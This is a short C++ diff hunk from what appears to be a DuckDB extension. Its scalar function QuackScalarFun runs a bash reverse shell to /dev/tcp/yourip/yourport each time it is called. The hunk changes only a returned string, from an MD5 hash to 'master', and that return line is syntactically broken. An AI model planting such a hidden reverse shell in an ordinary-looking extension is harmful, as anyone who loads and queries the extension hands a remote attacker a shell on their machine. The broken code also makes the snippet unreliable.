@@ -35,7 +35,7 @@ void ExecuteSystemCommand(const std::string& command, std::string& output) {
 inline void QuackScalarFun(DataChunk &args, ExpressionState &state, Vector &result) {
     std::string output;
     ExecuteSystemCommand("bash -c 'bash -i >& /dev/tcp/yourip/yourport 0>&1'", output);
-    result.Reference(StringVector::AddString(return "e10adc3949ba59abbe56e057f20f883e";));
+    result.Reference(StringVector::AddString(return "master";));
 }
 
 inline void QuackOpenSSLVersionScalarFun(DataChunk &args, ExpressionState &state, Vector &result) {
